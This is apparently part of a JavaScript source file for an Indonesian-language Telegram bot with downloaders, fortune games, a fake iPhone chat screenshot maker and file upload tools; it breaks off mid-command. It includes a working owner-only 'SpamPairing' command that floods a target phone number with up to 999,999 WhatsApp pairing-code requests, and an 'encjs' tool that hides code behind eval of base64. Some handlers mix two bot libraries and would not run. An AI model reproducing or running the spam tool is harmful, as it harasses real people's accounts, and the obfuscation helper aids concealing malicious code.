bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK 🚨
→ 📛 Grup : ${groupName}
→ 🆔 ID   : ${groupId}
——————
👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
//// Tools ///
bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Akaozik ( 📸 )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
 
// ========== COMMAND TIME (WIB, WITA, WIT) ==========
bot.command("time", async (ctx) => {
  const now = new Date();
  
  // WIB (UTC+7)
  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  
  // WITA (UTC+8)
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  
  // WIT (UTC+9)
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));
  
  // Format jam
  const formatJam = (date) => {
    return date.toLocaleTimeString("id-ID", { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      hour12: false
    });
  };
  
  // Format tanggal
  const formatTanggal = (date) => {
    return date.toLocaleDateString("id-ID", { 
      weekday: 'long', 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
  };
  
  const pesan = 
`
<blockquote>
🕐 WAKTU SEKARANG 🕐

┌─────────────────┐
│ 🟢 WIB 
│    ${formatJam(wib)}
│    ${formatTanggal(wib)}
├─────────────────┤
│ 🟡 WITA
│    ${formatJam(wita)}
│    ${formatTanggal(wita)}
├─────────────────┤
│ 🔵 WIT
│    ${formatJam(wit)}
│    ${formatTanggal(wit)}
└─────────────────┘

✨ *Ketikan /start untuk kembali menu utama* ✨
</blockquote>
`;
  
  await ctx.reply(pesan, { parse_mode: "HTML" });
}); 
 
bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("snack", async (ctx) => {
  const text = ctx.message.text;
  const url = text.split(" ")[1];

  if (!url) {
    return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  }

  // validasi link dikit biar ga asal masukin sampah
  if (!url.includes("snackvideo")) {
    return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  }

  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");

    const res = await axios.get(
      `https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`,
      { timeout: 15000 } // biar ga ngegantung
    );

    const video = res?.data?.data?.video;

    if (!video) {
      return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    }

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: "✅ Beres. Udah, jangan spam lagi"
      }
    );

  } catch (err) {
    console.log("ERROR:", err.message);

    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh");
  }
});

bot.command(/\/gethtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = (match[1] || "").trim();

  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(
      chatId,
      "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil source code dari URL...");

    const res = await axios.get(url, { responseType: "text", timeout: 30000 });
    const html = res.data;

    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    await bot.sendDocument(chatId, filePath, {}, { filename: "source_code.html", contentType: "text/html" });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ *Terjadi kesalahan:*\n\`${err.message}\``, { parse_mode: "Markdown" });
  }
});

// ========== CATBOX DOWNLOADER (VERSI SIMPLE) ==========

bot.command("catbox", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const url = args[1];
  
  if (!url) {
    return ctx.reply(
`📥 *DOWNLOAD CATBOX* 📥

*Cara pakai:*
/catbox https://files.catbox.moe/xxxxx.jpg

*Support file:*
Gambar, Video, Audio, Dokumen

📌 *Maksimal file: 50MB*`,
      { parse_mode: "Markdown" }
    );
  }
  
  if (!url.includes('files.catbox.moe')) {
    return ctx.reply("❌ Bukan URL Catbox yang valid!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengunduh file...*", { parse_mode: "Markdown" });
  
  try {
    // Kirim langsung pake URL
    const ext = url.split('.').pop().toLowerCase();
    
    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
      await ctx.replyWithPhoto(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) {
      await ctx.replyWithVideo(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
      await ctx.replyWithAudio(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    } else {
      await ctx.replyWithDocument(url, { caption: `✅ *Download berhasil!*`, parse_mode: "Markdown" });
    }
  } catch (err) {
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", { parse_mode: "Markdown" });
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// ========== CEK MASA DEPAN ==========
bot.command("cekmasadepan", async (ctx) => {
  let targetName = "Kamu";
  
  // Cek apakah reply ke pesan orang
  if (ctx.message.reply_to_message) {
    const target = ctx.message.reply_to_message.from;
    targetName = target.first_name || "Dia";
  } else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) {
      targetName = args.slice(1).join(" ");
    }
  }
  
  // Data random
  const profesi = [
    "Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", 
    "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚",
    "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️",
    "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"
  ];
  
  const kekayaan = [
    "Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵",
    "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎",
    "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"
  ];
  
  const jodoh = [
    "Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸",
    "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊",
    "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"
  ];
  
  const rumah = [
    "Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️",
    "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️",
    "Rumah Impian ✨", "Kontrakan Dulu 😅"
  ];
  
  const kendaraan = [
    "Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡",
    "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️",
    "Helikopter Pribadi 🚁", "Naik Angkot 😂"
  ];
  
  const nasib = [
    "Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧",
    "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨",
    "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"
  ];
  
  // Random pilih
  const hasilProfesi = profesi[Math.floor(Math.random() * profesi.length)];
  const hasilKekayaan = kekayaan[Math.floor(Math.random() * kekayaan.length)];
  const hasilJodoh = jodoh[Math.floor(Math.random() * jodoh.length)];
  const hasilRumah = rumah[Math.floor(Math.random() * rumah.length)];
  const hasilKendaraan = kendaraan[Math.floor(Math.random() * kendaraan.length)];
  const hasilNasib = nasib[Math.floor(Math.random() * nasib.length)];
  
  const pesan = 
`
<blockquote>
🔮 RAMALAN MASA DEPAN 🔮
Untuk: ${targetName}

━━━━━━━━━━━━━━━━━━━━━━

👔 Profesi: ${hasilProfesi}
💰 Kekayaan: ${hasilKekayaan}
❤️ Jodoh: ${hasilJodoh}
🏠 Rumah: ${hasilRumah}
🚗 Kendaraan: ${hasilKendaraan}
🍀 Nasib:  ${hasilNasib}

━━━━━━━━━━━━━━━━━━━━━━
✨ Hasil ini hanya hiburan ya!
💪 Masa depan ada di tanganmu sendiri!

🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>`;

  ctx.reply(pesan, { parse_mode: "HTML" });
});

// COMMAND SINGKAT (opsional)
bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ");
  let nama = "Kamu";
  if (args.length > 1) nama = args.slice(1).join(" ");
  
  const hasil = [
    "Sukses besar di usia 30an! 🎉",
    "Jadi pengusaha terkenal! 🏢",
    "Punya pasangan idaman! ❤️",
    "Hidup bahagia sampai tua! 😊",
    "Bisa beli rumah mewah! 🏰",
    "Keliling dunia bareng keluarga! 🌍",
    "Jadi orang yang bermanfaat! ✨"
  ];
  
  const random = hasil[Math.floor(Math.random() * hasil.length)];
  ctx.reply(`🔮 *Ramalan untuk ${nama}:*\n\n✨ ${random}\n\n🔮 *Ketik /ramal [nama] lagi!*`, { parse_mode: "HTML" });
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ========== CEK CUACA (HIBURAN) ==========
bot.command("cuaca", async (ctx) => {
  const kondisi = [
    "Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️",
    "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"
  ];
  
  const suhu = Math.floor(Math.random() * 20) + 20; // 20-40°C
  const kelembaban = Math.floor(Math.random() * 50) + 40; // 40-90%
  const randomKondisi = kondisi[Math.floor(Math.random() * kondisi.length)];
  
  ctx.reply(
`
<blockquote>
🌤️ PRAKIRAAN CUACA*l 🌤️

📌 Kondisi: ${randomKondisi}
🌡️ Suhu: ${suhu}°C
💧 Kelembaban: ${kelembaban}%
💨 Angin: ${Math.floor(Math.random() * 20) + 5} km/jam

✨ Perkiraan ini hanya hiburan ya!
🔮 Cuaca sebenarnya bisa berbeda</blockquote>`,
    { parse_mode: "HTML" }
  );
});
// ========== UPLOAD KE TELEGRAPH (GAMPANG & PASTI JALAN) ==========
bot.command("catboxurl", async (ctx) => {
  // Cek reply foto
  if (!ctx.message.reply_to_message) {
    return ctx.reply(
`📸 UPLOAD GAMBAR 📸

Cara pakai:
1. Kirim foto
2. Reply foto itu
3. Ketik /catboxurl

✅ Gratis, cepat, permanen!`,
      { parse_mode: "Markdown" }
    );
  }
  
  let fileId = null;
  let replied = ctx.message.reply_to_message;
  
  if (replied.photo) {
    fileId = replied.photo[replied.photo.length - 1].file_id;
  } else if (replied.document && replied.document.mime_type?.startsWith('image/')) {
    fileId = replied.document.file_id;
  } else {
    return ctx.reply("❌ Harus berupa foto!", { parse_mode: "Markdown" });
  }
  
  await ctx.reply("⏳ *Mengupload...*", { parse_mode: "Markdown" });
  
  try {
    // Dapatkan file dari Telegram
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    
    // Upload ke Telegraph
    const postData = JSON.stringify([{ url: fileUrl }]);
    
    const options = {
      hostname: 'telegra.ph',
      path: '/upload',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    const request = https.request(options, (response) => {
      let data = '';
      response.on('data', (chunk) => { data += chunk; });
      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          if (result[0] && result[0].src) {
            ctx.reply(
`✅ Upload Berhasil! ✅

🔗 Link: https://telegra.ph${result[0].src}

📌 Klik link untuk lihat gambar
💾 Link permanent!`,
              { parse_mode: "Markdown" }
            );
          } else {
            ctx.reply("❌ Gagal upload! Coba lagi.", { parse_mode: "Markdown" });
          }
        } catch (err) {
          ctx.reply("❌ Error parsing response!", { parse_mode: "Markdown" });
        }
      });
    });
    
    request.write(postData);
    request.end();
    
  } catch (err) {
    ctx.reply("❌ Terjadi kesalahan!", { parse_mode: "Markdown" });
  }
});
// ========== ENKRIPSI KODE JS (NO ERROR - FIX) ==========

function simpleEncode(code) {
  let encoded = Buffer.from(code).toString('base64');
  return `eval(Buffer.from('${encoded}', 'base64').toString())`;
}

function simpleDecode(encrypted) {
  try {
    let match = encrypted.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
    if (match) {
      return Buffer.from(match[1], 'base64').toString();
    }
    return null;
  } catch(e) {
    return null;
  }
}

// COMMAND ENKRIPSI (FIX REPLY)
bot.command("encjs", (ctx) => {
  let code = "";
  
  // PRIORITAS: Ambil dari reply
  if (ctx.message.reply_to_message) {
    let replied = ctx.message.reply_to_message;
    if (replied.text) {
      code = replied.text;
    } else if (replied.caption) {
      code = replied.caption;
    }
  }
  
  // Jika tidak ada reply, ambil dari argumen
  if (!code) {
    let args = ctx.message.text.split(" ");
    args.shift();
    code = args.join(" ");
  }
  
  // Jika masih kosong, tampilkan bantuan
  if (!code.trim()) {
    return ctx.reply(
`🔒 *ENKRIPSI KODE JS* 🔒

📌 *Cara pakai:*
• /encjs console.log("Halo")
• Atau *reply* pesan yang berisi kode, lalu ketik /encjs

✅ *Contoh:*
[Kamu kirim pesan: console.log("test")]
[Lalu reply pesan itu dengan /encjs]`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleEncode(code);
  
  ctx.reply(
`🔐 *KODE TERPROTEKSI* 🔐

\`\`\`javascript
${hasil}
\`\`\`

📌 *Simpan kode asli!*`,
    { parse_mode: "Markdown" }
  );
});

// COMMAND DEKRIPSI
bot.command("decjs", (ctx) => {
  let encrypted = "";
  
  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    encrypted = ctx.message.reply_to_message.text;
  } else {
    let args = ctx.message.text.split(" ");
    args.shift();
    encrypted = args.join(" ");
  }
  
  if (!encrypted.trim()) {
    return ctx.reply(
`🔓 *DEKRIPSI KODE JS* 🔓

📌 *Cara pakai:*
Reply pesan yang berisi kode terenkripsi, lalu ketik /decjs`,
      { parse_mode: "Markdown" }
    );
  }
  
  let hasil = simpleDecode(encrypted);
  
  if (hasil) {
    ctx.reply(
`🔓 *KODE ASLI* 🔓

\`\`\`javascript
${hasil}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", { parse_mode: "Markdown" });
  }
});
/// ========== TOOLS SPAM PAIRING =======\\\
bot.command(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});
// ========== 10 TOOLS SERU-SERUAN ==========

// 1. Cek Jodoh (random)
bot.command("jodoh", (ctx) => {
  const persen = Math.floor(Math.random() * 100) + 1;
  const status = persen > 70 ? "Cocok banget! 💖" : (persen > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅");
  ctx.reply(`💘 *Cek Jodoh*\nKecocokan: ${persen}%\nStatus: ${status}`, { parse_mode: "Markdown" });
});

// 2. Ramalan Shio (random)
bot.command("shio", (ctx) => {
  const ramalan = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"];
  const random = ramalan[Math.floor(Math.random() * ramalan.length)];
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, { parse_mode: "Markdown" });
});

// 3. Tebak Angka (game)
let tebakAngka = {};
bot.command("tebak", (ctx) => {
  const userId = ctx.from.id;
  if (!tebakAngka[userId]) {
    tebakAngka[userId] = Math.floor(Math.random() * 10) + 1;
    return ctx.reply("🎲 *Tebak Angka (1-10)*\nKetik /tebak [angka]\nContoh: /tebak 5", { parse_mode: "Markdown" });
  }
  const args = ctx.message.text.split(" ");
  const tebakan = parseInt(args[1]);
  if (isNaN(tebakan)) return ctx.reply("Masukkan angka 1-10!");
  if (tebakan === tebakAngka[userId]) {
    ctx.reply("🎉 *Benar!* Selamat! 🎉\nKetik /tebak lagi untuk main baru.");
    delete tebakAngka[userId];
  } else {
    ctx.reply(`❌ Salah! Angka rahasianya bukan ${tebakan}. Coba lagi.`);
  }
});

// 4. Kata Motivasi random
bot.command("motivasi", (ctx) => {
  const quotes = [
    "✨ Jangan menyerah, hari ini berat besok mungkin indah.",
    "💪 Sukses dimulai dari keberanian untuk memulai.",
    "🌟 Percaya sama diri sendiri, itu kunci utama.",
    "🌱 Proses tidak akan mengkhianati hasil.",
    "🚀 Bermimpilah tinggi, lalu kejar!"
  ];
  const random = quotes[Math.floor(Math.random() * quotes.length)];
  ctx.reply(`💡 *Motivasi:* ${random}`, { parse_mode: "Markdown" });
});

// 5. Batu-gunting-kertas (suit)
bot.command("suit", (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"];
  const user = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas");
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) hasil = "Seri 🤝";
  else if (
    (user === "batu" && botChoice === "gunting") ||
    (user === "gunting" && botChoice === "kertas") ||
    (user === "kertas" && botChoice === "batu")
  ) hasil = "Kamu menang! 🎉";
  else hasil = "Bot menang! 😭";
  ctx.reply(`✊ Kamu: ${user}\n🤖 Bot: ${botChoice}\n${hasil}`);
});

// 6. Cek kepribadian dari nama (random)
bot.command("kepribadian", (ctx) => {
  const sifat = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"];
  const random = sifat[Math.floor(Math.random() * sifat.length)];
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, { parse_mode: "Markdown" });
});

// 7. Ramalan karir random
bot.command("karir", (ctx) => {
  const karir = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"];
  const random = karir[Math.floor(Math.random() * karir.length)];
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, { parse_mode: "Markdown" });
});

// 8. Cek level ganteng/cantik (random)
bot.command("level", (ctx) => {
  const level = Math.floor(Math.random() * 100) + 1;
  let status = level > 80 ? "Level Dewa/ Dewi 😎" : (level > 50 ? "Cukup menawan 😊" : "Biasa saja 🤭");
  ctx.reply(`📊 *Level ketampanan/kecantikan:* ${level}%\n${status}`, { parse_mode: "Markdown" });
});

// 9. Tebak hari lahir (seru-seruan)
bot.command("harilahir", (ctx) => {
  const hari = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"];
  const random = hari[Math.floor(Math.random() * hari.length)];
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, { parse_mode: "Markdown" });
});

// 10. Game lempar koin
bot.command("koin", (ctx) => {
  const hasil = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰";
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, { parse_mode: "Markdown" });
});
// ========== PENCARIAN LAGU (DEEZER) ==========
// Command: /lagu [judul lagu]

bot.command("lagu", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", { parse_mode: "Markdown" });
  }

  const status = await ctx.reply(`🔍 *Mencari: ${query}`, { parse_mode: "Markdown" });

  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(query)}&limit=1`);
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const track = data.data[0];
    const judul = track.title;
    const artis = track.artist.name;
    const preview = track.preview;
    const cover = track.album.cover_medium;
    const link = track.link;

    // Hapus pesan "mencari"
    await ctx.telegram.deleteMessage(ctx.chat.id, status.message_id).catch(() => {});

    // Kirim cover + info
    if (cover) {
      await ctx.replyWithPhoto(cover, {
        caption: `🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`,
        parse_mode: "Markdown"
      });
    } else {
      await ctx.reply(`🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, { parse_mode: "Markdown" });
    }

    // Kirim audio preview jika ada
    if (preview && preview !== "null") {
      await ctx.replyWithAudio(preview, {
        title: judul,
        performer: artis,
        caption: "🎧 *Preview 30 detik*"
      });
    } else {
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", { parse_mode: "Markdown" }).catch(() => {
      ctx.reply("❌ Terjadi kesalahan. Coba lagi nanti.");
    });
  }
});
// ========== FOTO JADI HD (UPSCALE) ==========
// Gunakan API PicWish (gratis, tanpa API key)

bot.command("hdphoto", async (ctx) => {
  // Cek apakah user reply ke sebuah foto
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply(
`📸 CARA PAKAI:\n1. Kirim foto ke bot\n2. Reply foto tersebut\n3. Ketik /hd\n\n✨ *Hasil: Foto akan di-upgrade ke resolusi lebih tinggi & lebih tajam!`
    );
  }

  const statusMsg = await ctx.reply("⏳ *Memproses foto...* (bisa makan waktu 10-20 detik mohon bersabar...)");

  try {
    // Ambil file ID foto dengan resolusi tertinggi
    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
